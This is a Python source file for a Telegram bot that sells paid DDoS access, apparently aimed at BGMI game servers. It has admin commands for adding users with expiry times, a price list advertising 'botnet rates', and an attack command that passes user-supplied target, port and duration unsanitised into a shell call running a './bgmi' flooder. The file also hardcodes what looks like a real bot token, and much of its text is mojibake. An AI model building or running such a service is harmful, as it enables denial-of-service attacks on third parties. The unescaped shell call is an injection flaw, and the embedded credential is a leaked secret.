#!/usr/bin/python3

import telebot
import subprocess
import requests
import datetime
import os

# insert your Telegram bot token here
bot = telebot.TeleBot('7350883849:AAGkxJecRtQmEHFs2kFzf6zcDwi2i-PgAVs')
# Admin user IDs
admin_id = ["948895728","1712525673","1175384555","1881941753","7224546032","1906267455","6515611578"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"


# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass


# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    admin_id = ["6266215827"]
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found â."
            else:
                file.truncate(0)
                response = "Logs cleared successfully â"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

import datetime

# Dictionary to store the approval expiry date for each user
user_approval_expiry = {}

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"

# Function to add or update user approval expiry date
def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit == "hour" or time_unit == "hours":
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit == "day" or time_unit == "days":
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit == "week" or time_unit == "weeks":
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit == "month" or time_unit == "months":
        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
    else:
        return False
    
    user_approval_expiry[user_id] = expiry_date
    return True

# Command handler for adding a user with approval time
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "Invalid duration format. Please provide a positive integer followed by 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
                bot.reply_to(message, response)
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = f"User {user_to_add} added successfully for {duration} {time_unit}. Access will expire on {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} ð."
                else:
                    response = "Failed to set approval expiry date. Please try again later."
            else:
                response = "User already exists ð¤¦ââï¸."
        else:
            response = "Please specify a user ID and the duration (e.g., 1hour, 2days, 3weeks, 4months) to add ð."
    else:
        response = "ê°Êá´á´ á´á´ á´Êá´Êá´ ê±Êá´Êá´ Êá´Éª á´Êá´ á´á´ á´á´ á´á´á´Êá´ á´á´Éª á´ÊÉª ÊÊÉª É¢á´ê± ÊÊá´Éª Êá´ Êá´Ê á´Êá´ ê°Êá´á´ á´á´Éª á´á´á´Ê É´ÊÉª á´ÉªÊá´á´ Êá´Ê:- DESTROYER â."

    bot.reply_to(message, response)

# Command handler for retrieving user info
@bot.message_handler(commands=['myinfo'])
def get_user_info(message):
    user_id = str(message.chat.id)
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else "N/A"
    user_role = "Admin" if user_id in admin_id else "User"
    remaining_time = get_remaining_approval_time(user_id)
    response = f"ð¤ Your Info:\n\nð User ID: <code>{user_id}</code>\nð Username: {username}\nð Role: {user_role}\nð Approval Expiry Date: {user_approval_expiry.get(user_id, 'Not Approved')}\nâ³ Remaining Approval Time: {remaining_time}"
    bot.reply_to(message, response, parse_mode="HTML")




@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully ð."
            else:
                response = f"User {user_to_remove} not found in the list â."
        else:
            response = '''Please Specify A User ID to Remove. 
â Usage: /remove <userid>ð'''
    else:
        response = "ê°Êá´á´ á´á´ á´Êá´Êá´ ê±Êá´Êá´ Êá´Éª á´Êá´ á´á´ á´á´ á´á´á´Êá´ á´á´Éª á´ÊÉª ÊÊÉª É¢á´ê± ÊÊá´Éª Êá´ Êá´Ê á´Êá´ ê°Êá´á´ á´á´Éª á´á´á´Ê É´ÊÉª á´ÉªÊá´á´ Êá´Ê:- DESTROYER â."

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found â."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully â"
        except FileNotFoundError:
            response = "Logs are already cleared â."
    else:
        response = "ê°Êá´á´ á´á´ á´Êá´Êá´ ê±Êá´Êá´ Êá´Éª á´Êá´ á´á´ á´á´ á´á´á´Êá´ á´á´Éª á´ÊÉª ÊÊÉª É¢á´ê± ÊÊá´Éª Êá´ Êá´Ê á´Êá´ ê°Êá´á´ á´á´Éª á´á´á´Ê É´ÊÉª á´ÉªÊá´á´ Êá´Ê:- DESTROYER â."
    bot.reply_to(message, response)



@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "USERS are already cleared. No data found â."
                else:
                    file.truncate(0)
                    response = "users Cleared Successfully â"
        except FileNotFoundError:
            response = "users are already cleared â."
    else:
        response = "ê°Êá´á´ á´á´ á´Êá´Êá´ ê±Êá´Êá´ Êá´Éª á´Êá´ á´á´ á´á´ á´á´á´Êá´ á´á´Éª á´ÊÉª ÊÊÉª É¢á´ê± ÊÊá´Éª Êá´ Êá´Ê á´Êá´ ê°Êá´á´ á´á´Éª á´á´á´Ê É´ÊÉª á´ÉªÊá´á´ Êá´Ê:- DESTROYER â."
    bot.reply_to(message, response)
 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found â"
        except FileNotFoundError:
            response = "No data found â"
    else:
        response = "ê°Êá´á´ á´á´ á´Êá´Êá´ ê±Êá´Êá´ Êá´Éª á´Êá´ á´á´ á´á´ á´á´á´Êá´ á´á´Éª á´ÊÉª ÊÊÉª É¢á´ê± ÊÊá´Éª Êá´ Êá´Ê á´Êá´ ê°Êá´á´ á´á´Éª á´á´á´Ê É´ÊÉª á´ÉªÊá´á´ Êá´Ê:- DESTROYER â."
    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found â."
                bot.reply_to(message, response)
        else:
            response = "No data found â"
            bot.reply_to(message, response)
    else:
        response = "ê°Êá´á´ á´á´ á´Êá´Êá´ ê±Êá´Êá´ Êá´Éª á´Êá´ á´á´ á´á´ á´á´á´Êá´ á´á´Éª á´ÊÉª ÊÊÉª É¢á´ê± ÊÊá´Éª Êá´ Êá´Ê á´Êá´ ê°Êá´á´ á´á´Éª á´á´á´Ê É´ÊÉª á´ÉªÊá´á´ Êá´Ê:- DESTROYER â."
        bot.reply_to(message, response)



# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, ðððððð ððððððð.ð¥ð¥\n\nððð«ð ðð­: {target}\nðð¨ð«ð­: {port}\nðð¢ð¦ð: {time} ðððð¨ð§ðð¬\nððð­ð¡ð¨ð: VIP- DESTROYER KA KALA JADU"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Handler for /bgmi command
@bot.message_handler(commands=['IPxKINGYT'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 10:
                response = "You Are On Cooldown â. Please Wait 10sec Before Running The /IPxKINGYT Command Again."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert time to integer
            time = int(command[3])  # Convert port to integer
            if time > 1201:
                response = "Error: Time interval must be less than 1200."
            else:
                record_command_logs(user_id, 'IPxKINGYT', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 699"
                subprocess.run(full_command, shell=True)
                response = f" Attack Finished. Target: {target} Port: {port} Port: {time}"
        else:
            response = "â Usage :- /IPxKINGYT <target> <port> <time>"  # Updated command syntax
    else:
        response = ("ð« Unauthorized Access! ð«\n\nOops! It seems like you don't have permission to use the /IPxKINGYT command.                                                                          DM TO BUY ACCESS:- DESTROYER")

    bot.reply_to(message, response)



# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "â No Command Logs Found For You â."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command ð¡."

    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''ð¤ Available commands:
ð¥ /IPxKINGYT : Method For IPxKINGYT Servers. 
ð¥ /rules : Please Check Before Use !!.
ð¥ /mylogs : To Check Your Recents Attacks.
ð¥ /plan : Checkout Our Botnet Rates.
ð¥ /myinfo : TO Check Your WHOLE INFO.

ð¤ To See Admin Commands:
ð¥ /admincmd : Shows All Admin Commands.

Buy From :- DESTROYER
Official Channel :- https://t.me/+6pLYLxgt8QI5ZmFl
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''âï¸á´¡á´Êá´á´á´á´ á´á´ á´Êá´á´Éªá´á´ á´á´á´s Êá´á´, {user_name}! á´ÊÉªs Éªs ÊÉªÉ¢Ê Ç«á´á´ÊÉªá´Ê sá´Êá´ á´Ê Êá´sá´á´ á´á´á´s. á´á´ É¢á´á´ á´á´á´á´ss.
ð¤Try To Run This Command : /help 
âBUY :- DESTROYER'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules â ï¸:

1. Dont Run Too Many Attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.
3. MAKE SURE YOU JOINED https://leapgype.me OTHERWISE NOT WORK
4. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:

Vip ð :
-> Attack Time : 300 (S)
> After Attack Limit : 10 sec
-> Concurrents Attack : 5

Pr-ice Listð¸ :
Day-->150 Rs
Week-->500 Rs
Month-->1400 Rs
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

ð¥ /add <userId> : Add a User.
ð¥ /remove <userid> Remove a User.
ð¥ /allusers : Authorised Users Lists.
ð¥ /logs : All Users Logs.
ð¥ /broadcast : Broadcast a Message.
ð¥ /clearlogs : Clear The Logs File.
ð¥ /clearusers : Clear The USERS File.
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "â ï¸ Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users ð."
        else:
            response = "ð¤ Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command ð¡."

    bot.reply_to(message, response)




while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)


